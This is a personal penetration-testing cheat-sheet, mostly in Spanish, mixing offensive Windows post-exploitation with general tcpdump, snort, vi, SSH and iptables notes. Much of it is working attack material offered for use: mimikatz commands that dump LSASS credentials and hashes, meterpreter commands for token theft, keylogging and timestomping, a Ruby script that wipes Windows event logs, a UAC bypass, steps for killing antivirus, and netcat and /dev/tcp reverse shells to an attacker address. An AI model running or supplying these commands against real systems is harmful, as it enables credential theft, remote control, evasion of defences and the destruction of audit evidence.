To run mimikatz you well need mimikatz.exe and sekurlsa.dll on the system you're targeting. 
privilege::debug
inject::process lsass.exe sekurlsa.dll                   / or  inject::service samss sekurlsa.dll
@getLogonPasswords full
sekurlsa::logonpasswords full

Opcion 2) Use the mimikatz build-in on metasploit

>>meterpreter>>load mimikatz
>>meterpreter>>msv
>>meterpreter>>mimikatz_command -f samdump::hashes

>>mimikatz_command -f service::list

>>mimikatz_command -f sekurlsa::searchpasswords

>>mimikatz_command -f process::list

>>mimikatz_command -f sekurlsa::msv

>>mimikatz_command -f hash::lm

>>mimikatz_command -f hash::ntlm

>>mimikatz_command -f system::user

>>mimikatz_command -f system::computer

>>mimikatz_command -f samdump::hashes

>>mimikatz_command -f crypto::listStores CERT_SYSTE_STORE_CURRENT_USER       //lista contenedores de certificados
                                         CERT_SYSTEM_STORE_LOCAL_MACHINE
                                         CERT_SYSTEM_STORE_CURRENT_SERVICE
                                         CERT_SYSTEM_STORE_SERVICES
                                         CERT_SYSTEM_STORES_USERS
                                         CERT_SYSTEM_CURRENT_USER_GROUP_POLICY
                                         CERT_SYSTEM_LOCAL_MACHINE_GROUP_POLICY
                                         CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE
>>mimikatz_command -f crypto::listCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE "Root"   //lista certificados de un contenedor
>>mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE "Root"  //exporta los certificados
Nota: en caso de que un certificado no permita ser exportado deberíamos parchear la CryptoAPI o el servicio de aislamiento
de claves CNG. >>crypto::patchapi   o   >>crypto::patchcng
>>mimikatz_command -f crypto::listProviders

Otras herramientas para Dump'ear hashes: Gsecdump.exe / Pwdump7 / Metasploit hashdump / 
      herramienta online para generar hashes: http://www.sinfocol.org/herramientas/hashes.php
                                              findmyhash (trabaja desde consola con servicios online)
mACHETE>> User3:1013:E7EED3F5C2C85B88AAD3B435B51404EE:6AA15B3D14492D3FA4AA7C5E9CDC0E6A:::
          - 1st field: username(Administrator, User1, etc.)
          - 2nd field: Relative Identification (RID):last 3-4 digits of the Security Identifier (SID) unique for each user
          - 3rd field : LM hash
	  - 4th field : NTLM hash

Nota: Desde WIN 8.1 & 2012R2 se aplica las siguientes medidas de ¿seguridad?
REF: https://technet.microsoft.com/library/dn344918.aspx#BKMK_CredentialsProtectionManagement
- Restricted admin mode for Remote Desktop Connection //Avoid user credentials to be sent to the server(and stolen)
-*Aun asi permite la autenticacion Pass-the-hash, pass-the-ticket & overpass-the-hash con CredSSP
- LSA Protection (Previene la inyeccion de codigo) //Deny memory access to LSASS process
-*Bypassed by a driver or another protected process (mimikatz has a Driver ;)
- Protected users Security group //no more (Mr Nice Guy) NTLM, WDigest, CredSSP, no delegation nor SSO, only Kerberos
-*Kerberos ticket can still be stolen and replayed (and smartcard/pin code is in memory;)
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

Eventos|EventLog|Authentication|logueos


""""""""""""""""""""""""""""""""""""wevtutil.exe ( Administrar Eventos WIN)""""""""""""""""""""""""""""""""""""""""""""""""

exportar un registro de eventos a un archivo:
#wevtutil epl Security C:\Eventos.evtx
obtener informacion sobre un evento
#wevtutil gl Microsoft-Windows-Winlogon/Diagnostic
obtener lista de los eventos
#wevtutil el
obtener lista de los publicadores de eventos
#wevtutil ep
hacer un backup de un evento-log y luego limpiar el registro de ese evento
#wevtutil cl application /bu:C:\Windows\log.evtx

"""""""""""""""""""""""""""""""""""wecutil.exe (Recopilador de eventos de Windows) """"""""""""""""""""""""""""""""""""""""
"Permite crear y administrar suscripciones a eventos reenviados desde origenes
de eventos remotos compatibles con el protocolo WS-Management"

""""""""""""""""""""""""""""""""""""""""""""""""""powershell""""""""""""""""""""""""""""""""""""""""""""""""""""""""
Extracting last 100 account authentication:
>>get-eventlog -log security | where-object {$_.EventID -match "^680$|^528$|^672$|^4768$|^4776$" –AND $_.UserName -notmatch 'SYSTEM|NETWORK SERVICE|LOCAL SERVICE|ANONYMOUS LOGON' –AND $_.TimeGenerated -gt [datetime]::today } | sort-object -property TimeGenerated | select-object -last 100 | Format-Table -AutoSize –Wrap

Extraer los ultimos 50 logueos y autenticaciones en una maquina remota en los ultimos 5 dias:
>>get-eventlog -computername MARTINPC -log security | where-object {$_.EventID -match  "^680$|^528$|^540$|^672$|^4768$|^4624$|^4776$" –AND  $_.Message -match "testuser1" –AND $_.TimeGenerated -gt  (get-date).adddays(-5) }| sort-object -property TimeGenerated | select-object -last 50 | Format-Table TimeCreated, ID, ProviderName, Message -AutoSize –Wrap

""""""""""""""""""""""""""""""""""""""""""""""""""""""wmic""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

Extraer autenticaciones y logueos en sistema remoto en un archivo HTML con formato de tabla
>>WMIC /node:remotesystem /output:c:\temp\authentication_events.html NTEVENT WHERE "LogFile='security' and (eventcode='680' or eventcode='528' or eventcode='672' or eventcode='4768' or eventcode='4776')" list brief /format:htable.xsl

Obtener detalles del Host
>>WMIC /node:192.9.200.10 /user:administrator /password:pass computersystem list brief /format:list
Obtener usuarios
>>WMIC /node:192.9.200.10 /user:administrator /password:pass computersystem get username
Crear un proceso
>>WMIC /node:192.9.200.10 /user:admin /password:pass process call create "calc.exe"
Listar procesos
>>WMIC /node:192.9.200.10 /user:admin /password:pass process get /format:list

"""""""""""""""""""""""""""""""""""""""""""""""""""Secpol.msc""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

Stop PasssTheHash
Secpol.msc/LocalPolicies/UserRightsAssignments/DebugPrograms       Delete Administrator/System

""""""""""""""""""""""""""""""""Limpiar Eventos a través de Consola RUBY on Metasploit"""""""""""""""""""""""""""""""""""""""
>>meterpreter>>irb
            [*]Starting IRB Shell
            [*]The 'client' variable node...
             >>log = client.sys.eventlog.open ('system')
             >>log.clear
             >> ;););););););););););););)   y no queda nada abajo de la alfombra...
             
        Tambien podemos hacer un script con esto:
        
        					# Clears Windows Event Logs
						evtlogs = [
        					'security',
        					'system',
        					'application',
        					'directory service',
        					'dns server',
        					'file replication service'
        					]
						print_line("Clearing Event Logs, this will leave an event 517")
						evtlogs.each do |evl|
        					print_status("Clearing the #{evl} Event Log")
        					log = client.sys.eventlog.open(evl)
        					log.clear
						end
						print_line("All Clear! You are a Ninja!")
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""             
             

Nota: Datos: 
-EVXT es el formato de log de eventos
-Logs Files are stored in %System32%winevt%logs
-Referencia: https://www.sans.org/reading-room/whitepapers/forensics/windows-logon-forensics-34132
             https://www.sans.org/reading-room/whitepapers/logging/evtx-windows-event-logging-32949
-Directivas de Seguridad Local En WIN : secpol.msc
-EventIDs List: http://ss64.com/ps/syntax-eventids.html
             

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<METASPLOIT FRAMEWORK>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


"""""""""""""""""""""""""""""""""""""""""""""msfconsole comandos básicos:""""""""""""""""""""""""""""""""""""""""""""""""""

back          Move back from the current context
banner        Display an awesome metasploit banner
cd            Change the current working directory
color         Toggle color
connect       Communicate with a host
edit          Edit the current module with $VISUAL or $EDITOR
exit          Exit the console
get           Gets the value of a context-specific variable
getg          Gets the value of a global variable
go_pro        Launch Metasploit web GUI
Grep          the output of another command
help          Help menu
info          Displays information about one or more module
irb           Drop into irb scripting mode
jobs          Displays and manages jobs
kill          Kill a job
load          Load a framework plugin
loadpath      Searches for and loads modules from a path
makerc        Save commands entered since start to a file
popm          Pops the latest module off the stack and makes it active
previous      Sets the previously loaded module as the current module
pushm         Pushes the active or list of modules onto the module stack
quit          Exit the console
reload_all    Reloads all modules from all defined module paths
rename_job    Rename a job
resource      Run the commands stored in a file
route         Route traffic through a session
save          Saves the active datastores
search        Searches module names and descriptions
sessions      Dump session listings and display information about sessions
set           Sets a context-specific variable to a value
setg          Sets a global variable to a value
show          Displays modules of a given type, or all modules
sleep         Do nothing for the specified number of seconds
spool         Write console output into a file as well the screen
threads       View and manipulate background threads
unload        Unload a framework plugin
unset         Unsets one or more context-specific variables
unsetg        Unsets one or more global variables
use           Selects a module by name
version       Show the framework and console library version numbers


"""""""""""""""""""""""""""""""""""""""""""""""meterpreter comandos utiles:""""""""""""""""""""""""""""""""""""""""""""""""""

help
sysinfo
ls
use priv
ps
migrate PID
use incognito
list_tokens -u
list_tokens -g
steal_token PID
drop_token
getsystem
shell
execute -f cmd.exe -i
execute -f cmd.exe -H -i -t
rev2self
reg command
setdesktop number
screenshot
upload file
download file
keyscan_start
keyscan_dump
keyscan_stop
getprivs
uictl enable keyboard/mouse
background
hashdump
use sniffer
sniffer_interfaces
sniffer_dump interfaceID pcapname
sniffer_dump interfaceID packet-buffer
sniffer_stats interfaceID
sniffer_stop interfaceID
add_user username password -h ip
add_group_user 'Domain admins' username -h ip
clearev
timestomp
reboot
search
getuid


En windows 7 nos podemos encontrar con UAC:

meterpreter>getsystem
[-] priv_elevate_getsystem: Operation failed: The environment is incorrect.
meterpreter>run post/windows/gather/win_privs                    **nos muestra los privilegios actuales

Solution: Bypass the UAC
meterpreter>background
>search uac
>use exploit/windows/local/bypassuac                             **Ojo con los AV
>set LHOST+LPORT+PAYLOAD then exploit....and ;)
meterpreter>getsystem
...got system via technique....................




""""""""""""""""""""""""""""""""""""""""""""""""""ANTIVIRUS""""""""""""""""""""""""""""""""""Killing in the name of.....
Opcion 1:
>>meterpreter>>run killav.rb             //con privilegios --> getsystem

Si vemos en detalle el código de killav.rb vamos a ver que tenemos una lista de los nombre de procesos de los 
antivirus mas comunes....

  			apimonitor.exe
  			aplica32.exe
  			apvxdwin.exe
  			arr.exe
  			atcon.exe
  			atguard.exe
  			atro55en.exe
  			atupdater.exe
  			atwatch.exe
  			au.exe
  			aupdate.exe
  			auto-protect.nav80try.exe
  			autodown.exe
  			autotrace.exe
  			autoupdate.exe
  			avconsol.exe
  			ave32.exe
  			avgcc32.exe
  			avgctrl.exe...............................bla bla bla
  			
Un antivirus tiene procesos asociados que van a revivir a nuestro cadaver (antivirus)
Por ejemplo ESET tiene defaulteada la opcion Enable-SelfDefense que NO permite usar el comando de WIN:
>> sc config ekrn start= disabled
>>[SC] OpenService ERROR 5:
>>
>>Acceso denegado.
  
Si deshabilitamos la opcion Enable-Self Defense recien vamos a poder Asesinar al Antivirus:

>>sc config ekrn start= disabled
>>[SC] ChangeServiceConfig CORRECTO   ;););)   ojo que para llegar acá deberíamos haber deshabilitado el servicio y reiniciado el sistema................




Opcion 2:

ESET antivirus aun estando desactivado tiene activo el modulo HIPS con "exploracion de memoria avanzada" que detecta por ejemplo la ejecucion de bypassuac




<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
NETBIOS/SMB

smbclient:

nmap'ear puerto 139
o
telnet'ear IP 139
if open...
nmblookup -B IP -S \*
if it has <20>....el recurso está compartido
                                            The values in the <xx> brackets can be:
                                            00 base computernames and workgroups, also in "*" queries
                                            01 master browser, in magic __MSBROWSE__ cookie
                                            03 messaging/alerter service; name of logged-in user  <--- This one is cool too
                                            20 resource-sharing "server service" name  <--- Check this one ---
                                            1B domain master-browser name
                                            1C domain controller name
                                            1E domain/workgroup master browser election announcement [?]
Herramientas relacionadas: nbtscan (Linux) + nbtstat (WIN) 

$smbclient -L \\\\COMPUTER -I IP
if password required, put the password ;)
$smbclient -L \\\\COMPUTER\\C -I IP -d 3 -n NAMEusedInThisNETBIOSsession -U userNameUsed

montando el sistema compartido:

$mount -t cifs //IP/Recurso_compartido /mnt/Punto_de_montaje -o username=USER,password=PASS
ó
$mount -t smbfs IP:/Recurso_compartido /mnt/punto_de_montaje -o username=USER,workgroup=TEST
ó
$smbmount //IP/Recurso_compartido /mnt/Punto_de_montaje -o username=USER
ó
$smbmount "\\\Samba1\\Recurso" -U USER -c 'mount /Recurso -u 500 -g 100'


"""""""""""""""""""""""""""""""""""""""""""""""nbtscan""""""""""""""""""""""""""""""""""""""""""""""""""""""""

Informacion sobre un host netbios
ejemplo:
$nbtscan -vh 192.9.200.10
                        Doing NBT name scan for addresses from 192.9.200.10
                        NetBIOS Name Table for Host 192.9.200.10:
			Incomplete packet, 155 bytes long.
			Name             Service          Type
			----------------------------------------
			SRV-CENTRAL      Workstation Service
			WORKGROUP        Domain Name
			SRV-CENTRAL      File Server Service
			Adapter address: 00:25:64:fc:c2:94
			----------------------------------------

"""""""""""""""""""""""""""""""""""""""""""""""psexec"""""""""""""""""""""""""""""""""""""""""""""""""""""""""
in MSFCONSOLE
>>search psexec
>>use exploit/windows/smb/psexec
Configure options and then...
>>exploit

;););););););););););););););)






<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



Editor vi

_Cursor:
hjkl : izq/aba/arr/der
b mueve el cursor al comienzo de la palabra anterior
e mueve el cursor al final de la palabra siguiente
0 mueve el cursor al comienzo de la línea (cero)
$ mueve el cursor al final de la línea
_Entrada de texto:
a añade texto a partir del carácter en que está situado el cursor.
A añade texto al final de la línea actual.
i inserta texto a partir de la posición del cursor
I inserta texto al principio de la línea actual.
o inserta una línea debajo de la posición del cursor
O inserta una línea encima de la posición del cursor
:r fich  permite insertar el fichero fich tras la línea actual
_Borrar y cambiar texto:
x borra el carácter en el cursor
nx borra n caracteres hacia la derecha, incluido el que está sobre el cursor.
nX borra n caracteres hacia la izquierda.
r sustituye el carácter en el cursor
dd borra la línea en la que está el cursor
dw borra la palabra actual
ndd borra n líneas hacia abajo incluyendo la que contiene el cursor.
_Dehaciendo comandos:
u deshace el comando previo
U deshace todos los cambios realizados en la linea actual
_Abandonar vi:
ZZ Guarda los cambios en el fichero original, y vuelve al intérprete de comandos
:wq Igual que ZZ
:q! Abandona el editor, no guarda los cambios, y vuelve al intérprete de comandos
_Scroll de pantalla:
ctrl-d una pantalla abajo
ctrl-u una pantalla arriba
_Busqueda:
Otro método de posicionarse dentro de un fichero es buscando una cadena de caracteres. En el modo de comandos, cualquier cadena de caracteres precedida por / significa el comando de búsqueda hacia adelante. El cursor se posiciona en la primera ocurrencia de dicha cadena.
El comando n busca hacia adelante la siguiente ocurrencia.
Para buscar hacia atrás, se utiliza el comando ?



	




<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


tcpdump

operadores: and|or|not ; inbound|outbound (para PPP protocols) ; 



listar interfaces
$tcpdump -D   
guardar la captura en file.cap
$tcpdump -w file.cap
ver direcciones IP y numeros de puerto en lugar de nombre de dominio y servicio
$tcpdump -n
capturar paquetes donde el destino es 192.168.1.1
$tcpdump -n dst host 192.168.1.1
capturar paquetes cuyo origen es 192.168.1.1
$tcpdump -n src host 192.168.1.1
capturar paquetes cuyo destino u origen sea 192.168.1.1
$tcpdump -n host 192.168.1.1
capturar paquetes cuya red de destino/origen/origen+destino sea 192.168.1.0/24
$tcpdump -n dst net 192.168.1.0/24 | $tcpdump -n src net 192.168.1.0/24 | $tcpdump -n net 192.168.1.0/24
capturar paquetes cuyo puerto de destino sea 23
$tcpdump -n dst port 23
capturar paquetes cuyo rango de puertos de destino este entre 1-1024
$tcpdump -n dst portrange 1-1024
capturar paquetes TCP cuyo rango de puertos de destino este entre 1-1024
$tcpdump -n tcp dst portrange 1-1024
capturar paquetes con destino 192.168.1.1 y puerto 23
$tcpdump -n "dst host 192.168.1.1 and dst port 23"
capturar paquetes con destino 192.168.1.1 y puerto 23 o 80
$tcpdump -n "dst host 192.168.1.1 and (dst port 23 or dst port 80)"
capturar paquetes icmp
$tcpdump -v icmp
capturar paquetes arp
$tcpdump -v arp
capturar paquetes icmp o arp (lo mismo para el resto de los protocolos: tcp,udp,rarp,ip,ipv6) 
$tcpdump -v "arp or icmp"
capturar paquetes broadcast o multicast
$tcpdump -n "broadcast or multicast"
capturar 500 bytes de datos por cada paquete en lugar de los 68 bytes por default
$tcpdump -s 500
buscando a metasploit
$tcpdump -r5g.pcap -l -s0 -w - | strings | grep "PUT /"
Captura: -nn (No resuelve HostName ni portName) -v (Verbose) -X (Packets content in Hex+ASCII) -S (Seq numbers)
-s0 (-s define el tamaño en bytes de la captura, -s0 captura todo) -c1 (cantidad 1 paq) icmp (icmp) ;)
$tcpdump -nnvXSs 0 -c1 icmp
Captura por tamaño
$tcpdump less 32 
$tcpdump greater 64
$tcpdump <= 128


Nota: una buena herramienta para leer capturas de tcpdump muy grandes es tcp-reduce


Advanced tcpdump ----------------->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

_____________________________________IP HEADER______________________________
|                                                                          |
0                                      16                                 31
|-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|	
| VERSION(4)|IHL(4)|TYPE OF SERVICE(8) |      TOTAL LENGTH    (16)         |
----------------------------------------------------------------------------
|       IDENTIFICATION  (16)           |FLAGS (3) FRAGMENT OFFSET (13)     |
----------------------------------------------------------------------------
|       TTL (8) PROTOCOL (8)           |   HEADER CHECKSUM (16)            |
----------------------------------------------------------------------------
|                       IP ORIGEN   (32)                                   |
----------------------------------------------------------------------------
|                       IP DESTINO  (32)                                   |
----------------------------------------------------------------------------
|  OPCIONES (VARIA TAMAÑO) + RELLENO (PARA CABECERA MULTIPLO DE 32 BITS)   |
|+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-|


____________________________________TCP HEADER______________________________
|                                                                          |
|                                                                          |
|+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-|
|  SOURCE PORT (16BITS)               |    DEST PORT   (16 )               |
|--------------------------------------------------------------------------|
|                             SEQUENCE NUMBER                              |
----------------------------------------------------------------------------
|                         ACKNOWLEDGMENT NUMBER                            |
|--------------------------------------------------------------------------|
| DATA OFFSET (4) RESERVED (3)        |        WINDOW SIZE  (16)           |    
| FLAGS (9) NS/CWR/ECE/U/A/P/R/S/F 
| bits:      0  0   0  0 0 0 0 1 0    |                                    |
|--------------------------------------------------------------------------|
|          CHECKSUM (16)              |URGENT POINTER(16)if URG flag is set|
|--------------------------------------------------------------------------|
|          OPTIONS (VARIABLE 0-320 BITS, DIVISIBLE BY 32)                  |
|      Nota: Options (Padded at the end with "0" bytes if necessary.)      |
|--------------------------------------------------------------------------|
|+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-|






captura paquetes desde la interfaz wlan0, cantidad de paquetes 10, filtrando por flag SYN en el paquete tcp
$tcpdump -i wlan0 -c10 'tcp[13]=2'
captura paquetes, -l activando un buffer de linea, filtrando tcp, puerto 80, host x.x.x.x, usando el comando string (que imprime datos reconocidos
como texto), y GREPeampos HTTP, el operador -w - escribe los datos a un STDOUT en lugar de un archivo.
$tcpdump -i wlan0 -l -w - tcp host x.x.x.x dst port 80 \ | strings | grep http
captura de paquetes, filtrado tcp, puerto 80, net x.x.x.x/X, STRINGeando, GREPeando las lineas 'GET\|Host' para ver las URL
$tcpdump -i wlan0 -l -w - net x.x.x.x/X and port 80 \ | strings | grep 'GET\|Host' 

ejemplo masking: 
IP HEADER:
Version+IHL: 01000101 (valor comun de este campo en IPv4)
para enmascarar los primeros 4 bits y filtrar solamente teniendo en cuenta los ultimos 4 bits (IHL):
0100 0101: 1° byte original
0000 1111: masking the byte. 0 va a enmascarar los valores y 1 los mantiene (0xF en Hex o 15 en Dec)
----------
0000 0101: resultado de enmascarar. 
en forma practica, para tcpdump sería:
$tcpdump -i eth0 'IP[0] & 15 > 5'
ó
$tcpdump -i eth0 'IP[0] & 0xF > 5'

captura paquetes con el bit MF, incluyendo el ultimo paquete que tiene el bit MF seteado a 0, teniendo en cuenta que
el bit DF va a estar en 0 en este ultimo paquete y no en 1. (Matching the fragments and the last fragments)
$tcpdump -i eth0 '((ip[6:2] > 0) and (not ip [6] = 64))'

captura paquetes con los flags SYN-SYN/ACK and not ACK
Enmascaramos el ACK para capturar solamente SYN y SYN/ACK
00010010 : SYN-ACK packet
00000010 : mask (2 in decimal)
--------
00000010 : result (2 in decimal)

Every bits of the mask match !
$tcpdump -i eth1 'tcp[13] & 2 = 2'

						RESUMEN PARA CAPTURA DE BANDERAS:
						
						>>>URGENT (URG) packets...
						tcpdump 'tcp[13] & 32 != 0'
						
						>>>ACKNOWLEDGE (ACK) packets
						tcpdump 'tcp[13] & 16 != 0'
						
						>>>PUSH (PSH) packets
						tcpdump 'tcp[13] & 8 != 0'
						
						>>>RESET (RST) packets
						tcpdump 'tcp[13] & 4 != 0'
						
						>>>SYNCHRONIZE (SYN) packets
						tcpdump 'tcp[13] & 2 != 0'
						
						>>>FINISH (FIN) packets
						tcpdump 'tcp[13] & 1 != 0'
						
						>>>SYNCHRONIZE/ACKNOWLEDGE (SYNACK) packets
						tcpdump 'tcp[13] = 18'
						
						Capture SYN Flags
						#tcpdump 'tcp[tcpflags] == tcp-syn'
						Capture RST Flags
						#tcpdump 'tcp[tcpflags] == tcp-rst'
						Capture FIN Flags
						#tcpdump 'tcp[tcpflags] == tcp-fin'
						
						

Identifying Noteworthy Traffic
(Finally, there are a few quick recipes you’ll want to remember for catching specific and specialized traffic, such as malformed / likely-malicious packets.) 

Packets with both the RST and SYN flags set (this should never be the case)
# tcpdump 'tcp[13] = 6'
Find cleartext HTTP GET requests (Ex. lynx www.google.com OR GET www.google.com)
# tcpdump 'tcp[32:4] = 0x47455420'
Find SSH connections on any port (via banner text)
# tcpdump 'tcp[(tcp[12]>>2):4] = 0x5353482D'
Packets with a TTL less than 10 (usually indicates a problem or use of traceroute)
# tcpdump 'ip[8] < 10'
Packets with the Evil Bit set (hacker trivia more than anything else) ;);;);;););););););););););););););)
# tcpdump 'ip[6] & 128 != 0'

TKS To: (https://danielmiessler.com/study/tcpdump/#gs.jufPjHI)





<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
                                                   SSH

Error común:
$sshd start
sshd re-exec requires execution with an absolute path
solucion: indicar la ruta completa:
$/usr/sbin/sshd


Tip: es mejor correr sshd OnDemand con el comando >systemctl start sshd.socket, de esta manera evitamos que el Daemon
este corriendo y solo se inicia cuando el socket recibe una peticion de conexion



copiar archivos a traves de SSH:

option -v nos muestra el copy status, special for ansiosos

hacia el remoto
$ scp FILE.txt user@servidor:~/directorio_remoto
desde el remoto
$ scp user@servidor:/home/usuario /C
copiar desde un servidor a otro:	
$ scp user@servidor1:/root/FILE.txt user@servidor2:/root
copia carpeta completa:
$ scp -r /carpeta_local user@servidor:/directorio_remoto
hacia el remoto manteniendo el timestamp del origen:     -->importante si queremos "implantar" un timestamp falso
$ scp -rvp test root@192.168.4.200:/root/Desktop/
comprimir y copiar de forma rapida archivos/carpetas al remoto:   -->Esto sucede a nivel de Red 'el destino recibe el file original sin comprimir'
$ scp -C linux-nrpe-agent.tar.gz root@192.168.4.200:/root/
copiar archivos sin usar password:
$ ssh-keygen -t rsa
$ ssh-copy-id root@192.168.4.200
$ scp key stdin root@192.168.4.200:/root/

______________________________________________________________
script para copiar a varios servidores:
_______________# nano /tmp/destfile.txt
192.168.4.200
192.168.4.2
192.168.4.90
#chmod 777 /tmp/destfile.txt
_______________# nano /scripts/multiscp.sh
#!/bin/bash
## Author: Ankam Ravi Kumar
## Purpose: Copy files to multiple Server using single script
## Date: 21st July 2016
echo -e "Please Enter the file path which you want to copy:\c"
read file
for dest in `cat /tmp/destfile.txt`; do
  scp -rC $file ${dest}:/tmp/
done
_______________# chmod u+x /scripts/multiple.sh
_______________# sh /scripts/mutiple.sh
_______________________________________________________________



>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

snort:

installation from sources
gzip -d and tar xvf tar.gz

$ ./configure
$ make
$ make install

**********************modos de ejecucion:
sniffer mode
packet logger mode
network intrussion detection system(NIDS)
inline mode
*****************************************

argumentos:  $ snort -v/-vd/-vde ; $ snort -vde -l ./log ; $ snort -b -l ./log ;


directorios utiles: generators (generators ID resume) ; gen-msg.map (Signature/Snort ID) ; 


reglas:

pueden ser creadas manualmente/ bajadas desde snort.org o administradas automaticamente con PulledPork (googlecode o github)

$ tar xvzf pulledpork.tar.gz
$ cd pulledpork
$ cp pulledpor k.pl /usr/local/bin/ && chmod +x /usr/local/bin/pulledpork.pl



________________________________________SNORT posibles errores_________________________________________________________
"instalando en Linux / ParrotSec 4.2.6-parrot-686-pae / Linux parrot 4.2.6-parrot-686-pae #1 SMP Wed Dec 30 12:40:13 EST 2015 i686 GNU/Linux"
  

- ERROR!  dnet header not found, go get it from _____>>>> apt-get install libdnet-dev / apt-get install libdumbnet-dev
- ERROR!  daq_static library not found, go get it from ______>>>> bajar el daq.tar.gz de  snort.org _____>> ./configure & make & make install (Errores en la instalacion de DAQ: LEX y BISON ___>>>> apt-get install flex & bison

- ERROR   al intentar iniciar $ snort
"snort: error while loading shared libraries: libsfbpf.so.0: cannot open shared object file: No such file or directory"
__________>>>> solucion:  $ ldconfig


- ERROR!  pcap DAQ does not support inline _______>>>> usar afpacket ó nfq como DAQ en lugar de pcap
Ex. $ snort -de -i eth0:eth1 --daq-dir /usr/local/lib/daq/daq_afpacket.la -c ../snort.conf 

______________________________________PULLEDPORK posibles errores______________________________________________________

Siguiendo el Step by Step: (https://s3.amazonaws.com/snort-org-site/production/document_files/files/000/000/069/original/Snort-IPS-Tutorial.pdf?AWSAccessKeyId=AKIAIXACIED2SPMSC7GA&Expires=1456431963&Signature=SWPzAjItKty46b%2B0qXkqRGy6Vro%3D)    mega.z -_-

Despues de configurar pulledpork......... 
$ /usr/local/bin/pulledpork.pl -c /usr/local/etc/snort/pulledpork.conf -T -l
"If all goes well, PulledPork consolidated all rules into one file at /etc/snort/rules/snort.rules" ;)



- ERROR   Can't locate Crypt/SSLeay.pm....bla bla bla....BEGIN failed--compilation aborted at /usr/local/bin/  pulledpork.pl line 28.

__________>>>> solucion:  $ perl -MCPAN -e shell
           (perl shell)   $ install Crypt::SSLeay (Ojo! ver Posible ERROR:) solucion: apt-get install libssl-dev       

Posible ERROR:     openssl-version.c:2:30: fatal error: openssl/opensslv.h: No existe el fichero o el directorio
 #include <openssl/opensslv.h>
                              ^
compilation terminated.
Failed to build and link a simple executable using OpenSSL
No 'Makefile' created  NANIS/Crypt-SSLeay-0.72.tar.gz
  /usr/bin/perl Makefile.PL INSTALLDIRS=site -- NOT OK
Failed during this command:
 NANIS/Crypt-SSLeay-0.72.tar.gz               : writemakefile NO -- No 'Makefile' created


Notas utiles: https://github.com/nanis/Crypt-SSLeay
              https://metacpan.org/pod/Crypt::SSLeay#INSTALL
              




 _  _  ___  ___ __   _  ___ 
| \| || __||_ _/ _| / \|_ _|
| \\ || _|  | ( (_ | o || | 
|_|\_||___| |_|\__||_n_||_| 
                          
NETCAT

Compilando Netcat:
Flags options:     -t (telnet)  -e (gaping security hole)
#

#netcat -lpv 9999                         → escuchando en el puerto 9999
#netcat -e /bin/sh 192.9.200.99 9999      →se conecta al listen abierto en el anterior comando abriendo una shell(LINUX)
#netcat -e cmd.exe 192.9.200.99 9999      →se conecta al listen abierto y abre una terminal cmd.exe" WINDOWS
#nc -n -X 5 -x 127.0.0.1:9050 <target_host> <target_port>  →Pasar el tráfico de nc a través de TOR

If GAPING_SECURITY_HOLE is disabled, tenemos varias opciones:
#nc -n -vv -l -p 666        							→(attacker side (192.9.200.10))
#mknod backpipe p && nc 192.9.200.10 666 0<backpipe | /bin/bash 1>backpipe      →(target side)
Enjoy....

#nc -n -vv -l -p 666
#/bin/bash -i > /dev/tcp/192.9.200.10/666 0<&1 2>&1 
Enjoy

#nc -n -vv -l -p 666
#mknod backpipe p && telnet 192.9.200.10 666 0<backpipe | /bin/bash 1>backpipe
Enjoy



 _  ___ ___  _   ___ _    ___  __ 
| || o \_ _|/ \ | o ) |  | __|/ _|
| ||  _/| || o || o \ |_ | _| \_ \
|_||_|  |_||_n_||___/___||___||__/

IPTABLES

chains: INPUT/OUTPUT/FORWARD
rules: ACCEPT/DROP(descarta)/REJECT(rechaza)/POSTROUTING(encaminamiento posterior)
       /PREROUTING(encaminamiento previo)/SNAT/NAT

-A                   "añade una cadena, la opcion -i define una interfaz de trabajo entrante"
-o                   "define una interfaz para trabajo saliente"
-j                   "añade una regla de destino del tráfico, que puede ser ACCEPT, DROP, REJECT
-m                   "define que se aplica la regla si hay una coinncidencia especifica"
